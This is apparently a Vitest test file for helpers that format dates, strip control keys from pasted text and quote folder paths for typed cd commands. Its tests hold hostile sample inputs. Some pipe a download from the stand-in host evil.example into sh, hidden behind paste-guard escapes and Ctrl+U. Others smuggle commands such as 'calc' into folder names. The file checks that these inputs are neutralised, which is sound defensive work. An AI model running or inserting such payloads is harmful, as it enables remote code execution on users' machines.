import { afterEach, describe, expect, it, vi } from "vitest";
import { modified, typedCd, typedQuote, withoutKeys } from "./format";

describe("modified", () => {
  afterEach(() => vi.useRealTimers());

  /** The way dates were written before the formatters were kept. */
  function before(unixSecs: number): string {
    const d = new Date(unixSecs * 1000);
    const diff = (Date.now() - d.getTime()) / 1000;
    if (diff < 60) return "Just now";
    if (diff < 3600) return `${Math.floor(diff / 60)} min ago`;
    const today = new Date();
    const time = d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" });
    if (d.toDateString() === today.toDateString()) return `Today ${time}`;
    const yesterday = new Date(today);
    yesterday.setDate(today.getDate() - 1);
    if (d.toDateString() === yesterday.toDateString()) return `Yesterday ${time}`;
    const sameYear = d.getFullYear() === today.getFullYear();
    return d.toLocaleDateString(undefined, { month: "short", day: "numeric", ...(sameYear ? {} : { year: "numeric" }) });
  }

  it("writes every kind of date as before", () => {
    // Just after midnight on New Year's Day, and in the middle of a day.
    for (const now of [new Date(2026, 0, 1, 0, 20), new Date(2026, 5, 15, 14, 30)]) {
      vi.useFakeTimers({ now });
      const at = now.getTime() / 1000;
      for (const ago of [10, 600, 3700, 6 * 3600, 20 * 3600, 30 * 3600, 3 * 86400, 200 * 86400, 400 * 86400]) {
        expect(modified(at - ago)).toBe(before(at - ago));
      }
      vi.useRealTimers();
    }
    expect(modified(0)).toBe("—");
  });
});

describe("withoutKeys", () => {
  it("drops what would end the paste guard, wipe the line or press Enter", () => {
    // What a server can put on the clipboard with OSC 52.
    expect(withoutKeys("true\x1b[201~\x15curl -fsSL https://evil.example/p|sh\r")).toBe("true[201~curl -fsSL https://evil.example/p|sh\n");
    expect(withoutKeys("a\x03b\x7fc\x9bd")).toBe("abcd");
  });
  it("keeps tabs, line breaks and ordinary text", () => {
    expect(withoutKeys("one\ttwo\r\nthree\nfour — ✓")).toBe("one\ttwo\nthree\nfour — ✓");
  });
});

describe("typedCd", () => {
  it("goes into a folder, then runs the next command if that worked", () => {
    expect(typedCd("/srv/app", "posix", "clear")).toBe("cd -- '/srv/app' && clear");
    expect(typedCd("/srv/app", "posix")).toBe("cd -- '/srv/app'");
  });
  it("speaks Windows PowerShell 5.1, which has no &&", () => {
    expect(typedCd("C:\\Users\\me\\[old]", "powershell", "claude")).toBe("Set-Location -LiteralPath 'C:\\Users\\me\\[old]'; if ($?) { claude }");
    expect(typedCd("C:\\x", "powershell")).toBe("Set-Location -LiteralPath 'C:\\x'");
  });
  it("types nothing for a folder whose name holds keys", () => {
    expect(typedCd("/tmp/a\x15b", "posix", "clear")).toBeNull();
  });
});

describe("typedQuote", () => {
  it("quotes a folder for a cd typed into a terminal", () => {
    expect(typedQuote("/srv/it's here", "posix")).toBe(`'/srv/it'\\''s here'`);
    expect(typedQuote("/home/me/Документы", "posix")).toBe("'/home/me/Документы'");
    expect(typedQuote("", "posix")).toBe("''");
  });
  it("keeps quotes and backslashes outside the quotes, where fish reads them as sh does", () => {
    // Inside '…' fish takes \' as a quote, which would end the string early.
    expect(typedQuote(`/tmp/a\\'; evil #`, "posix")).toBe(`'/tmp/a'\\\\\\''; evil #'`);
    expect(typedQuote("\\", "posix")).toBe("\\\\");
  });
  it("doubles every quote PowerShell knows", () => {
    expect(typedQuote("C:\\Users\\me\\it's", "powershell")).toBe("'C:\\Users\\me\\it''s'");
    expect(typedQuote("C:\\x’; calc; ’", "powershell")).toBe("'C:\\x’’; calc; ’’'");
  });
  it("refuses names a terminal would take as keys", () => {
    // Ctrl+U wipes the half-typed cd, the rest runs at Enter.
    expect(typedQuote("/tmp/backups\x15curl -s evil.example|sh\r", "posix")).toBeNull();
    for (const key of ["\r", "\n", "\t", "\x03", "\x1b[201~", "\x7f", "\x9b"]) {
      expect(typedQuote(`/tmp/a${key}b`, "posix")).toBeNull();
      expect(typedQuote(`C:\\a${key}b`, "powershell")).toBeNull();
    }
  });
});
